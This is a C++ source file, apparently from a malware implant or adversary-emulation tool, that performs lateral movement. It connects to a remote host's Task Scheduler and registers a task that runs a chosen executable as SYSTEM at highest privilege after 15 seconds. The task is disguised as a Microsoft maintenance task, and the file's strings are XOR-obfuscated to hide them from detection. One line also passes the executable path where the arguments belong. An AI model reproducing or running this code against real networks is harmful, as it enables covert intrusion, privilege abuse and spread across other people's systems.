#include "lat_move.hpp"
#include "logger.hpp"
#include "string_util.hpp"
#include "xor_obfuscation.hpp"
#include <format>
#include <set>
#include <taskschd.h>
#include <comdef.h>

#define _WIN32_DCOM

void logHresultFailure(const char* msg, HRESULT hr) {
    Logger::LogError(std::format("{} {}", msg, string_util::hresult_to_hex_str(hr)));
}

namespace lat_move {

std::wstring GetCurrExecutablePath() {
    wchar_t buffer[MAX_PATH];
    DWORD num_written = GetModuleFileNameW(NULL, buffer, MAX_PATH);
    if (num_written == 0) {
        throw std::invalid_argument(std::format("{} {}", XOR_LIT("GetModuleFileName failed with error code"), GetLastError()));
    }
    return std::wstring(buffer);
}

// Reference: // https://learn.microsoft.com/en-us/windows/win32/taskschd/registration-trigger-example--c---
bool CreateAndExecRemoteScheduledTask(const std::wstring& target, const std::wstring& exec_path, const std::wstring& exec_args) {
    std::string target_narrow = string_util::wstring_to_string(target);
    Logger::LogInfo(std::format(
        "{} {} {} {} {}", 
        XOR_LIT("Creating remote scheduled task on"),
        target_narrow,
        XOR_LIT("to execute"),
        string_util::wstring_to_string(exec_path),
        string_util::wstring_to_string(exec_args)
    ));

    LPCWSTR task_name = XOR_WIDE_LIT(L"Net Session File Management Task");
    bool result = false;

    // Initialize COM.
    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) {
        logHresultFailure(XOR_LIT("Failed to initialize COM. CoInitializeEx returned HRESULT:"), hr);
        return result;
    } else {
        Logger::LogDebug(XOR_LIT("Initialized COM"));
    }

    ITaskService *p_service = NULL;
    ITaskFolder *p_root_folder = NULL;
    ITaskDefinition *p_task = NULL;
    IRegistrationInfo *p_reg_info = NULL;
    IPrincipal *p_principal = NULL;
    ITaskSettings *p_settings = NULL;
    ITriggerCollection *p_trigger_collection = NULL;
    ITrigger *p_trigger = NULL;
    IRegistrationTrigger *p_registration_trigger = NULL;
    IActionCollection *p_action_collection = NULL;
    IAction *p_action = NULL;
    IExecAction *p_exec_action = NULL;
    IRegisteredTask *p_registered_task = NULL;

    do {
        // Set general COM security levels.
        hr = CoInitializeSecurity(
            NULL,
            -1,
            NULL,
            NULL,
            RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
            RPC_C_IMP_LEVEL_IMPERSONATE,
            NULL,
            0,
            NULL
        );
        if (FAILED(hr)) {
            logHresultFailure(XOR_LIT("Failed to set general COM security levels. CoInitializeSecurity returned HRESULT:"), hr);
            break;
        } else {
            Logger::LogDebug(XOR_LIT("Set general COM security levels."));
        }

        // Create an instance of the Task Service.
        hr = CoCreateInstance(
            CLSID_TaskScheduler,
            NULL,
            CLSCTX_INPROC_SERVER,
            IID_ITaskService,
            (void**)&p_service
        );
        if (FAILED(hr)) {
            logHresultFailure(XOR_LIT("Failed to create Task Service instance. CoCreateInstance returned HRESULT:"), hr);
            break;
        } else {
            Logger::LogDebug(XOR_LIT("Created Task Service instance."));
        }

        // Connect to the task service on the remote host.
        VARIANT remote_host_var;
        memset(&remote_host_var, 0, sizeof(VARIANT));
        remote_host_var.vt = VT_BSTR;
        remote_host_var.bstrVal = _bstr_t(target.c_str());
        VARIANT empty_variant;
        memset(&empty_variant, 0, sizeof(VARIANT));
        empty_variant.vt = VT_EMPTY;
        hr = p_service->Connect(
            remote_host_var,
            empty_variant,
            empty_variant,
            empty_variant
        );
        if (FAILED(hr)) {
            logHresultFailure(XOR_LIT("Failed to connect to remote task service. ITaskService::Connect returned HRESULT:"), hr);
            break;
        } else {
            Logger::LogDebug(XOR_LIT("Connected to remote task service."));
        }

        // Access \Microsoft\Windows task folder, which will hold the newly registered task
        hr = p_service->GetFolder(_bstr_t( L"\\Microsoft\\Windows"), &p_root_folder);
        if (FAILED(hr)) {
            logHresultFailure(XOR_LIT("Failed to get pointer to task folder. ITaskService::GetFolder returned HRESULT:"), hr);
            break;
        } else {
            Logger::LogDebug(XOR_LIT("Accessed task folder \\Microsoft\\Windows."));
        }

        // Delete task if it already exists
        hr = p_root_folder->DeleteTask(_bstr_t(task_name), 0);
        if (FAILED(hr)) {
            if (hr != HRESULT_FROM_WIN32(ERROR_FILE_NOT_FOUND)) {
                logHresultFailure(XOR_LIT("Failed to delete existing task on remote machine. ITaskFolder::DeleteTask returned HRESULT:"), hr);
            }
        } else {
            Logger::LogDebug(XOR_LIT("Deleted existing task with same name on remote machine."));
        }

        // Create task builder object
        hr = p_service->NewTask(0, &p_task);
        p_service->Release();
        p_service = NULL;
        if (FAILED(hr)) {
            logHresultFailure(XOR_LIT("Failed to create new task definition. ITaskService::NewTask returned HRESULT:"), hr);
            break;
        } else {
            Logger::LogDebug(XOR_LIT("Created new task definition."));
        }

        // Get registration info
        hr = p_task->get_RegistrationInfo(&p_reg_info);
        if (FAILED(hr)) {
            logHresultFailure(XOR_LIT("Failed to create get task registration info. ITaskDefinition::get_RegistrationInfo returned HRESULT:"), hr);
            break;
        } else {
            Logger::LogDebug(XOR_LIT("Accessed task registration info."));
        }

        // Set task registration info - author, source, version, description
        hr = p_reg_info->put_Author(_bstr_t(XOR_WIDE_LIT(L"Microsoft Corporation")));
        if (FAILED(hr)) {
            logHresultFailure(XOR_LIT("Failed to set task author. IRegistrationInfo::put_Author returned HRESULT:"), hr);
            break;
        } else {
            Logger::LogDebug(XOR_LIT("Set task author to Microsoft Corporation."));
        }

        hr = p_reg_info->put_Source(_bstr_t(XOR_WIDE_LIT(L"Microsoft Corporation")));
        if (FAILED(hr)) {
            logHresultFailure(XOR_LIT("Failed to set task source. IRegistrationInfo::put_Source returned HRESULT:"), hr);
            break;
        } else {
            Logger::LogDebug(XOR_LIT("Set task source to Microsoft Corporation."));
        }

        hr = p_reg_info->put_Version(_bstr_t(XOR_WIDE_LIT(L"1.0")));
        if (FAILED(hr)) {
            logHresultFailure(XOR_LIT("Failed to set task version. IRegistrationInfo::put_Version returned HRESULT:"), hr);
            break;
        } else {
            Logger::LogDebug(XOR_LIT("Set task version."));
        }

        hr = p_reg_info->put_Description(_bstr_t(XOR_WIDE_LIT(L"This task manages remote net share connections.")));
        p_reg_info->Release();
        p_reg_info = NULL;
        if (FAILED(hr)) {
            logHresultFailure(XOR_LIT("Failed to set task description. IRegistrationInfo::put_Description returned HRESULT:"), hr);
            break;
        } else {
            Logger::LogDebug(XOR_LIT("Set task description."));
        }

        // Create task principal
        hr = p_task->get_Principal(&p_principal);
        if (FAILED(hr)) {
            logHresultFailure(XOR_LIT("Failed to get task principal. ITaskDefinition::get_Principal returned HRESULT:"), hr);
            break;
        } else {
            Logger::LogDebug(XOR_LIT("Accessed task principal."));
        }

        hr = p_principal->put_Id(_bstr_t(XOR_WIDE_LIT(L"LocalSystem"))); 
        if (FAILED(hr)) {
            logHresultFailure(XOR_LIT("Failed to set task principal ID. IPrincipal::put_Id returned HRESULT:"), hr);
            break;
        } else {
            Logger::LogDebug(XOR_LIT("Set task principal ID to LocalSystem."));
        }

        // Set to run as SYSTEM with highest privileges
        hr = p_principal->put_UserId(_bstr_t(XOR_WIDE_LIT(L"S-1-5-18"))); 
        if (FAILED(hr)) {
            logHresultFailure(XOR_LIT("Failed to set task principal User ID. IPrincipal::put_GroupId returned HRESULT:"), hr);
            break;
        } else {
            Logger::LogDebug(XOR_LIT("Set task principal user ID to S-1-5-18."));
        }

        hr = p_principal->put_LogonType(TASK_LOGON_SERVICE_ACCOUNT);
        if (FAILED(hr)) {
            logHresultFailure(XOR_LIT("Failed to set task principal logon type. IPrincipal::put_LogonType returned HRESULT:"), hr);
            break;
        } else {
            Logger::LogDebug(XOR_LIT("Set task principal logon type to TASK_LOGON_SERVICE_ACCOUNT."));
        }

        hr = p_principal->put_RunLevel(TASK_RUNLEVEL_HIGHEST); 
        p_principal->Release();  
        p_principal = NULL;
        if (FAILED(hr)) {
            logHresultFailure(XOR_LIT("Failed to set task principal run level. IPrincipal::put_RunLevel returned HRESULT:"), hr);
            break;
        } else {
            Logger::LogDebug(XOR_LIT("Set task principal run level to TASK_RUNLEVEL_HIGHEST."));
        }

        // Create task settings
        hr = p_task->get_Settings(&p_settings);
        if (FAILED(hr)) {
            logHresultFailure(XOR_LIT("Failed to get task settings pointer. ITaskDefinition::get_Settings returned HRESULT:"), hr);
            break;
        } else {
            Logger::LogDebug(XOR_LIT("Accessed task settings."));
        }

        hr = p_settings->put_StartWhenAvailable(VARIANT_TRUE);
        p_settings->Release();
        p_settings = NULL;
        if (FAILED(hr)) {
            logHresultFailure(XOR_LIT("Failed to set task settings. ITaskSettings::put_StartWhenAvailable returned HRESULT:"), hr);
            break;
        } else {
            Logger::LogDebug(XOR_LIT("Set task to start when available."));
        }

        // Set registration trigger
        hr = p_task->get_Triggers(&p_trigger_collection);
        if (FAILED(hr)) {
            logHresultFailure(XOR_LIT("Failed to get task trigger collection. ITaskDefinition::get_Triggers returned HRESULT:"), hr);
            break;
        } else {
            Logger::LogDebug(XOR_LIT("Accessed task trigger collection."));
        }

        hr = p_trigger_collection->Create(TASK_TRIGGER_REGISTRATION, &p_trigger);
        p_trigger_collection->Release();
        p_trigger_collection = NULL;
        if (FAILED(hr)) {
            logHresultFailure(XOR_LIT("Failed to create trigger. ITriggerCollection::Create returned HRESULT:"), hr);
            break;
        } else {
            Logger::LogDebug(XOR_LIT("Created new trigger instance."));
        }

        hr = p_trigger->QueryInterface(IID_IRegistrationTrigger, (void**)&p_registration_trigger);
        p_trigger->Release();
        p_trigger = NULL;
        if (FAILED(hr)) {
            logHresultFailure(XOR_LIT("Failed to create registration trigger. ITrigger::QueryInterface returned HRESULT:"), hr);
            break;
        } else {
            Logger::LogDebug(XOR_LIT("Created registration trigger."));
        }

        hr = p_registration_trigger->put_Id(_bstr_t(XOR_WIDE_LIT(L"NetSessTaskTrigger")));
        if (FAILED(hr)) {
            logHresultFailure(XOR_LIT("Failed to set registration trigger ID. IRegistrationTrigger::put_Id returned HRESULT:"), hr);
            break;
        } else {
            Logger::LogDebug(XOR_LIT("Set registration trigger ID to NetSessTaskTrigger."));
        }

        // Set trigger delay of 15 seconds
        hr = p_registration_trigger->put_Delay(_bstr_t(XOR_WIDE_LIT(L"PT15S")));
        p_registration_trigger->Release();
        p_registration_trigger = NULL;
        if (FAILED(hr)) {
            logHresultFailure(XOR_LIT("Failed to set registration trigger delay. IRegistrationTrigger::put_Delay returned HRESULT:"), hr);
            break;
        } else {
            Logger::LogDebug(XOR_LIT("Set registration trigger delay to 15 seconds."));
        }

        // Create task executable action
        hr = p_task->get_Actions(&p_action_collection);
        if (FAILED(hr)) {
            logHresultFailure(XOR_LIT("Failed to get task actions collection pointer. ITaskDefinition::get_Actions returned HRESULT:"), hr);
            break;
        } else {
            Logger::LogDebug(XOR_LIT("Accessed task actions collection."));
        }

        hr = p_action_collection->Create(TASK_ACTION_EXEC, &p_action);
        p_action_collection->Release();
        p_action_collection = NULL;
        if (FAILED(hr)) {
            logHresultFailure(XOR_LIT("Failed to create task action. IActionCollection::Create returned HRESULT:"), hr);
            break;
        } else {
            Logger::LogDebug(XOR_LIT("Created new task action."));
        }

        hr = p_action->QueryInterface(IID_IExecAction, (void**)&p_exec_action);
        p_action->Release();
        p_action = NULL;
        if (FAILED(hr)) {
            logHresultFailure(XOR_LIT("Failed to create executable action. IAction::QueryInterface returned HRESULT:"), hr);
            break;
        } else {
            Logger::LogDebug(XOR_LIT("Created new task executable action."));
        }

        // Set executable path and args
        hr = p_exec_action->put_Path(_bstr_t(exec_path.c_str()));
        if (FAILED(hr)) {
            logHresultFailure(XOR_LIT("Failed to set action executable path. IExecAction::put_Path returned HRESULT:"), hr);
            break;
        } else {
            Logger::LogDebug(XOR_LIT("Set action executable path."));
        }

        if (!exec_args.empty()) {
            hr = p_exec_action->put_Arguments(_bstr_t(exec_path.c_str()));
            if (FAILED(hr)) {
                logHresultFailure(XOR_LIT("Failed to set action executable arguments. IExecAction::put_Arguments returned HRESULT:"), hr);
                break;
            } else {
            Logger::LogDebug(XOR_LIT("Set task executable arguments."));
        }
        } else {
            Logger::LogDebug(XOR_LIT("No executable args provided. Skipping task executable args."));
        }
        p_exec_action->Release();
        p_exec_action = NULL;

        // Save task
        hr = p_root_folder->RegisterTaskDefinition(
            _bstr_t(task_name),
            p_task,
            TASK_CREATE_OR_UPDATE, 
            empty_variant, 
            empty_variant, 
            TASK_LOGON_SERVICE_ACCOUNT,
            _variant_t(L""),
            &p_registered_task
        );
        if (FAILED(hr)) {
            logHresultFailure(XOR_LIT("Failed to register task definition. ITaskFolder::RegisterTaskDefinition returned HRESULT:"), hr);
            break;
        } else {
            Logger::LogDebug(XOR_LIT("Registered task definition."));
        }

        Logger::LogInfo(XOR_LIT("Successfully created and registered task to execute in 15 seconds."));
        result = true;
    } while (false);
    
    // Cleanup
    if (p_service != NULL) p_service->Release();
    if (p_root_folder != NULL) p_root_folder->Release();
    if (p_task != NULL) p_task->Release();
    if (p_reg_info != NULL) p_reg_info->Release();
    if (p_principal != NULL) p_principal->Release();
    if (p_settings != NULL) p_settings->Release();
    if (p_trigger_collection != NULL) p_trigger_collection->Release();
    if (p_trigger != NULL) p_trigger->Release();
    if (p_registration_trigger != NULL) p_registration_trigger->Release();
    if (p_action_collection != NULL) p_action_collection->Release();
    if (p_action != NULL) p_action->Release();
    if (p_exec_action != NULL) p_exec_action->Release();
    if (p_registered_task != NULL) p_registered_task->Release();
    CoUninitialize();

    Logger::LogDebug(XOR_LIT("Finished cleanup for creating scheduled task."));

    return result;
}

} // namespace
